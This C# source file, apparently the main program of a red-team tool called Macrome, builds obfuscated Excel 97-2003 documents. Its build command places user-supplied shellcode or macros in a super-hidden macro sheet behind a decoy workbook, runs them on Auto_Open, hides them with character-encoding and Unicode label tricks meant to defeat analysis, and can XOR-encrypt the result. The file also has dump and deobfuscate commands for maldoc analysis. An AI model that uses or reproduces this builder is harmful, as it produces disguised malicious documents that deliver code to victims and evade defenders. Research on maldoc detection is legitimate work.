using System;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;
using b2xtranslator.xls.XlsFileFormat;
using b2xtranslator.xls.XlsFileFormat.Records;
using Macrome.Encryption;
using Index = b2xtranslator.Spreadsheet.XlsFileFormat.Records.Index;

namespace Macrome
{

    public class Program
    { 
        public static string AssemblyDirectory
        {
            get
            {
                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                UriBuilder uri = new UriBuilder(codeBase);
                string path = Uri.UnescapeDataString(uri.Path);
                return Path.GetDirectoryName(path);
            }
        }

        /// <summary>
        /// Dumps information about BIFF records that are relevant for analysis. Defaults to sheet, label, and formula data.
        /// </summary>
        /// <param name="path">Path to the XLS file to dump</param>
        /// <param name="dumpAll">Dump all BIFF records, not the most commonly used by maldocs</param>
        /// <param name="showAttrInfo">Explicitly display PtgAttr information in Formula strings. Defaults to False.</param>
        /// <param name="dumpHexBytes">Dump the byte content of each BIFF record in addition to its content summary.</param>
        /// <param name="password">XOR Obfuscation decryption password to try. Defaults to VelvetSweatshop if FilePass record is found.</param>
        /// <param name="disableDecryption">Use this flag in order to skip decryption of the file before dumping.</param>

        public static void Dump(FileInfo path, bool dumpAll = false, bool showAttrInfo = false, bool dumpHexBytes = false, string password = "VelvetSweatshop", bool disableDecryption = false)
        {
            if (path == null)
            {
                Console.WriteLine("path argument must be specified in Dump mode. Run dump -h for usage instructions.");
                return;
            }

            if (path.Exists == false)
            {
                Console.WriteLine("path file does not exist.");
                return;
            }

            WorkbookStream wbs = new WorkbookStream(path.FullName);

            if (wbs.HasPasswordToOpen() && !disableDecryption)
            {
                FilePass fpRecord = wbs.GetAllRecordsByType<FilePass>().First();

                if (fpRecord.wEncryptionType == 0 && fpRecord.xorObfuscationKey != 0)
                {
                    XorObfuscation xorObfuscation = new XorObfuscation();
                    Console.WriteLine("FilePass record found - attempting to decrypt with password " + password);
                    try
                    {
                        wbs = xorObfuscation.DecryptWorkbookStream(wbs, password);
                    }
                    catch (ArgumentException argEx)
                    {
                        Console.WriteLine("Password " + password + " does not match the verifier value of the document FilePass. Try a different password.");
                        return;
                    }
                }
                else if (fpRecord.wEncryptionType == 1 && fpRecord.vMajor > 1)
                {
                    Console.WriteLine("FilePass record for CryptoAPI Found - Currently Unsupported.");
                    string verifierSalt = BitConverter.ToString(fpRecord.encryptionVerifier.Salt).Replace("-", "");
                    string verifier = BitConverter.ToString(fpRecord.encryptionVerifier.EncryptedVerifier).Replace("-", "");
                    string verifierHash = BitConverter.ToString(fpRecord.encryptionVerifier.EncryptedVerifierHash).Replace("-", "");
                    Console.WriteLine("Salt is: " + verifierSalt);
                    Console.WriteLine("Vrfy is: " + verifier);
                    Console.WriteLine("vHsh is: " + verifierHash);
                    Console.WriteLine("Algo is: " + string.Format("{0:x8}", fpRecord.encryptionHeader.AlgID));
                }

                else if (fpRecord.wEncryptionType == 1 && fpRecord.vMajor == 1)
                {
                    Console.WriteLine("FilePass record for RC4 Binary Document Encryption Found - Currently Unsupported.");
                }

            }

            int numBytesToDump = 0;
            if (dumpHexBytes) numBytesToDump = 0x1000;

            if (dumpAll)
            {
                List<BiffRecord> records;
                WorkbookStream fullStream = new WorkbookStream(PtgHelper.UpdateGlobalsStreamReferences(wbs.Records));
                records = fullStream.Records;
                foreach (var record in records)
                {
                    Console.WriteLine(record.ToHexDumpString(numBytesToDump, showAttrInfo));
                }
            }
            else
            {
                string dumpString = RecordHelper.GetRelevantRecordDumpString(wbs, dumpHexBytes, showAttrInfo);
                Console.WriteLine(dumpString);
            }
        }

        /// <summary>
        /// Deobfuscate a legacy XLS document to enable simpler analysis.
        /// </summary>
        /// <param name="path">Path to the XLS file to deobfuscate</param>
        /// <param name="neuterFile">Flag to insert a HALT() expression into all Auto_Open start locations. NOT IMPLEMENTED</param>
        /// <param name="password">XOR Obfuscation decryption password to try. Defaults to VelvetSweatshop if FilePass record is found.</param>
        /// <param name="outputFileName">The output filename used for the generated document. Defaults to deobfuscated.xls</param>
        public static void Deobfuscate(FileInfo path, bool neuterFile = false, string password = "VelvetSweatshop", string outputFileName = "deobfuscated.xls")
        {
            if (path == null)
            {
                Console.WriteLine("path argument must be specified in Deobfuscate mode. Run deobfuscate -h for usage instructions.");
                return;
            }

            if (path.Exists == false)
            {
                Console.WriteLine("path file does not exist.");
                return;
            }

            if (neuterFile)
            {
                throw new NotImplementedException("XLS Neutering Not Implemented Yet");
            }

            WorkbookStream wbs = new WorkbookStream(path.FullName);

            if (wbs.HasPasswordToOpen())
            {
                Console.WriteLine("FilePass record found - attempting to decrypt with password " + password);
                XorObfuscation xorObfuscation = new XorObfuscation();
                try
                {
                    wbs = xorObfuscation.DecryptWorkbookStream(wbs, password);
                }
                catch (ArgumentException argEx)
                {
                    Console.WriteLine("Password " + password + " does not match the verifier value of the document FilePass. Try a different password.");
                    return;
                }
            }

            WorkbookEditor wbEditor = new WorkbookEditor(wbs);

            wbEditor.NormalizeAutoOpenLabels();
            wbEditor.UnhideSheets();

            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = Directory.GetCurrentDirectory() + Path.DirectorySeparatorChar + outputFileName;
            Console.WriteLine("Writing deobfuscated document to {0}", outputPath);

            writer.WriteDocument(outputPath, wbEditor.WbStream);
        }

        /// <summary>
        /// Generate an Excel Document with a hidden macro sheet that will execute code described by the payload argument.
        /// </summary>
        /// <param name="decoyDocument">File path to the base Excel 2003 sheet that should be visible to users.</param>
        /// <param name="payload">Either binary shellcode or a newline separated list of Excel Macros to execute</param>
        /// <param name="payload64Bit">Binary shellcode of a 64bit payload, payload-type must be Shellcode</param>
        /// <param name="payloadType">Specify if the payload is binary shellcode or a macro list. Defaults to Shellcode</param>
        /// <param name="preamble">Preamble macro code to include with binary shellcode payload type</param>
        /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
        /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
        /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
        /// <param name="payloadMethod">How should shellcode be written in the document. Defaults to using the SheetPackingMethod for encoding.</param>
        /// <param name="password">Password to encrypt document using XOR Obfuscation.</param>
        /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
        /// <param name="localizedLabel">Use this flag in order to set a localized label in case Excel is not in US language. Default to Auto_Open</param>
        public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
            PayloadType payloadType = PayloadType.Shellcode, 
            string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, PayloadPackingMethod payloadMethod = PayloadPackingMethod.MatchSheetPackingMethod, 
            string password = "", string localizedLabel = "Auto_Open")
        {
            if (decoyDocument == null || payload == null)
            {
                Console.WriteLine("decoy-document and payload must be specified in Build mode. Run build -h for usage instructions.");
                return;
            }

            //Useful for remote debugging
            if (debugMode)
            {
                Console.WriteLine("Waiting for debugger to attach");
                while (!Debugger.IsAttached)
                {
                    Thread.Sleep(100);
                }
                Console.WriteLine("Debugger attached");
            }

            List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();


            string decoyDocPath = decoyDocument.FullName;

            WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
            List<string> sheetNames = wbs.GetAllRecordsByType<BoundSheet8>().Select(bs => bs.stName.Value).ToList();
            VBAInfo vbaInfo = VBAInfo.FromCompoundFilePath(decoyDocPath, sheetNames);
            
            List<string> preambleCode = new List<string>();
            if (preamble != null)
            {
                string preambleCodePath = new FileInfo(preamble).FullName;
                preambleCode = new List<string>(File.ReadAllLines(preambleCodePath));
            }
            
            WorkbookEditor wbe = new WorkbookEditor(wbs);

            wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);

            List<string> macros = null;
            byte[] binaryPayload = null;
            byte[] binary64Payload = null;

            //TODO make this customizable
            int rwStart = 0;
            int colStart = 0xA0;
            int dstRwStart = 0;
            int dstColStart = 0;

            int curRw = rwStart;
            int curCol = colStart;

            switch (payloadType)
            {
                 case PayloadType.Shellcode:
                     macros = MacroPatterns.GetX86GetBinaryLoaderPattern(preambleCode, macroSheetName);
                     binaryPayload = File.ReadAllBytes(payload.FullName);

                     if (payload64Bit != null && payload64Bit.Exists)
                     {
                         binary64Payload = File.ReadAllBytes(payload64Bit.FullName);
                     }

                     break;
                 case PayloadType.Macro:
                     macros = MacroPatterns.ImportMacroPattern(File.ReadAllLines(payload.FullName).ToList());
                     //Prepend the preamble to the imported pattern
                     macros = preambleCode.Concat(macros).ToList();
                     break;
                 default:
                     throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType),
                         "payloadType");
            }


            if (binaryPayload != null && binaryPayload.Length > 0)
            {
                 if (payloadMethod == PayloadPackingMethod.Base64)
                 {
                     wbe.SetMacroBinaryContent(binaryPayload, 0, dstColStart + 1, 0, 0, method, payloadMethod);
                 }
                 else
                 {
                     wbe.SetMacroBinaryContent(binaryPayload, curRw, curCol, dstRwStart, dstColStart + 1, method);   
                 }
                 
                 curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;

                 if (rwStart > 0xE000)
                 {
                     curRw = 0;
                     curCol += 1;
                 }

                 if (binary64Payload != null && binary64Payload.Length > 0)
                 {
                     if (payloadMethod == PayloadPackingMethod.Base64)
                     {
                         wbe.SetMacroBinaryContent(binary64Payload, 0, dstColStart + 2, 0, 0, method, payloadMethod);
                     }
                     else
                     {
                         wbe.SetMacroBinaryContent(binary64Payload, curRw, curCol, dstRwStart, dstColStart + 2, method);   
                     }

                     curRw = wbe.WbStream.GetFirstEmptyRowInColumn(colStart) + 1;

                     if (rwStart > 0xE000)
                     {
                         curRw = 0;
                         curCol += 1;
                     }
                     
                     macros = MacroPatterns.GetMultiPlatformBinaryPattern(preambleCode, macroSheetName);
                 }

                 if (payloadMethod == PayloadPackingMethod.Base64)
                 {
                     macros = MacroPatterns.GetBase64DecodePattern(preambleCode);
                 }
            }
            
            wbe.SetMacroSheetContent(macros, curRw,curCol, dstRwStart, dstColStart, method);

            // Initialize the Global Stream records like SupBook + ExternSheet
            wbe.InitializeGlobalStreamLabels();
            
            if (method == SheetPackingMethod.CharSubroutine || method == SheetPackingMethod.AntiAnalysisCharSubroutine)
            {
                 ushort charInvocationRw = 0xefff;
                 ushort charInvocationCol = 0x9f;
                 wbe.AddLabel("\u0000", charInvocationRw, charInvocationCol, true, true);

                 //Abuse a few comparison "features" in Excel
                 //1. Null bytes are ignored at the beginning and start of a label.
                 //2. Comparisons are not case sensitive, A vs a or Ḁ vs ḁ
                 //3. Unicode strings can be "decomposed" - ex: Ḁ (U+1E00) can become A (U+0041) - ◌̥ (U+0325)
                 //4. The Combining Grapheme Joiner (U+034F) unicode symbol is ignored at any location in the string in SET.NAME functions
                 wbe.AddLabel(UnicodeHelper.UnicodeArgumentLabel, null, true, true);
                 //Using lblIndex 2, since that what var has set for us
                 wbe.AddFormula(
                     FormulaHelper.CreateCharInvocationFormulaForLblIndex(charInvocationRw, charInvocationCol, 2), payloadMethod);
            }
            else if (method == SheetPackingMethod.ArgumentSubroutines)
            {
                ushort charInvocationRw = 0xefff;
                ushort charInvocationCol = 0x9f;
                
                ushort formInvocationRw = 0xefff;
                ushort formInvocationCol = 0x9e;
                
                ushort evalFormInvocationRw = 0xefff;
                ushort evalFormInvocationCol = 0x9d;

                //Lbl1
                wbe.AddLabel("c", charInvocationRw, charInvocationCol, false, false);
                //Lbl2
                wbe.AddLabel("f", formInvocationRw, formInvocationCol, false, false);
                
                //Lbl3
                wbe.AddLabel(UnicodeHelper.CharFuncArgument1Label, null, false, true);
                //Lbl4
                wbe.AddLabel(UnicodeHelper.FormulaFuncArgument1Label, null, false, true);
                //Lbl5
                wbe.AddLabel(UnicodeHelper.FormulaFuncArgument2Label, null, false, true);

                //Lbl6
                wbe.AddLabel("e", evalFormInvocationRw, evalFormInvocationCol, false, false);
                //Lbl7
                wbe.AddLabel(UnicodeHelper.FormulaEvalArgument1Label, null, false, true);


                List<Formula> charFunctionFormulas =
                    FormulaHelper.CreateCharFunctionWithArgsForLbl(charInvocationRw, charInvocationCol, 3,
                        UnicodeHelper.CharFuncArgument1Label);
                foreach (var f in charFunctionFormulas)
                {
                    wbe.AddFormula(f, payloadMethod);
                }

                List<Formula> formulaFunctionFormulas = FormulaHelper.CreateFormulaInvocationFormulaForLblIndexes(
                    formInvocationRw, formInvocationCol, UnicodeHelper.FormulaFuncArgument1Label,
                    UnicodeHelper.FormulaFuncArgument2Label, 4, 5);
                foreach (var f in formulaFunctionFormulas)
                {
                    wbe.AddFormula(f, payloadMethod);
                }

                List<Formula> formulaEvalFunctionFormulas =
                    FormulaHelper.CreateFormulaEvalInvocationFormulaForLblIndexes(
                        evalFormInvocationRw, evalFormInvocationCol, 
                        UnicodeHelper.FormulaEvalArgument1Label, 7);
                foreach (var f in formulaEvalFunctionFormulas)
                {
                    wbe.AddFormula(f, payloadMethod);
                }                
            }

            wbe.AddLabel(localizedLabel, rwStart, colStart);

            wbe.ObfuscateAutoOpen(localizedLabel);

            WorkbookStream createdWorkbook = wbe.WbStream;

            if (!string.IsNullOrEmpty(password))
            {
                Console.WriteLine("Encrypting Document with Password " + password);
                XorObfuscation xorObfuscation = new XorObfuscation();
                createdWorkbook = xorObfuscation.EncryptWorkbookStream(createdWorkbook, password);
                // createdWorkbook = createdWorkbook.FixBoundSheetOffsets();
            }

            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputFileName;
            Console.WriteLine("Writing generated document to {0}", outputPath);
            writer.WriteDocument(outputPath, createdWorkbook, vbaInfo);
        }


        /// <summary>
        /// Build an obfuscated XLS Macro Document, or Deobfuscate an existing malicious XLS Macro Document.
        /// </summary>
        /// <param name="args"></param>
        public static void Main(string[] args)
        {
            try
            {
                Command buildCommand = new Command("b",null);
                buildCommand.AddAlias("build");
                MethodInfo buildMethodInfo = typeof(Program).GetMethod(nameof(Build));
                buildCommand.ConfigureFromMethod(buildMethodInfo);

                Command deobfuscateCommand = new Command("d",null);
                deobfuscateCommand.AddAlias("deobfuscate");
                MethodInfo deobfuscateMethodInfo = typeof(Program).GetMethod(nameof(Deobfuscate));
                deobfuscateCommand.ConfigureFromMethod(deobfuscateMethodInfo);

                Command dumpCommand = new Command("dump", null);
                MethodInfo dumpMethodInfo = typeof(Program).GetMethod(nameof(Dump));
                dumpCommand.ConfigureFromMethod(dumpMethodInfo);


                RootCommand rootCommand = new RootCommand("Build an obfuscated XLS Macro Document, or Deobfuscate an existing malicious XLS Macro Document.")
                {
                    deobfuscateCommand,
                    buildCommand,
                    dumpCommand    
                };

                CommandLineBuilder builder = new CommandLineBuilder(rootCommand);
                builder.ConfigureHelpFromXmlComments(buildMethodInfo, null);

                //Manually set this after reading the XML for descriptions
                builder.Command.Description =
                    "Build an obfuscated XLS Macro Document or Deobfuscate an existing malicious XLS Macro Document.";

                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

                builder
                    .UseDefaults()
                    .Build()
                    .Invoke(args);
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected Exception Occurred:\n");
                Console.WriteLine(e);
            }
        }
        
        
        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }

        private static List<BiffRecord> GetDefaultMacroSheetRecords(bool isInternationalSheet = true)
        {
            string defaultMacroPath = AssemblyDirectory + Path.DirectorySeparatorChar + @"default_macro_template.xls";
            using (var fs = new FileStream(defaultMacroPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                //The last BOF/EOF set is our Macro sheet.
                List<BiffRecord> sheetRecords = wbs.GetRecordsForBOFRecord(wbs.GetAllRecordsByType<BOF>().Last());

                if (isInternationalSheet)
                {
                    WorkbookStream internationalWbs = new WorkbookStream(sheetRecords);
                    internationalWbs = internationalWbs.InsertRecord(new Intl(), internationalWbs.GetAllRecordsByType<Index>().First());
                    return internationalWbs.Records;
                }

                return sheetRecords;
            }

        }
    }
}
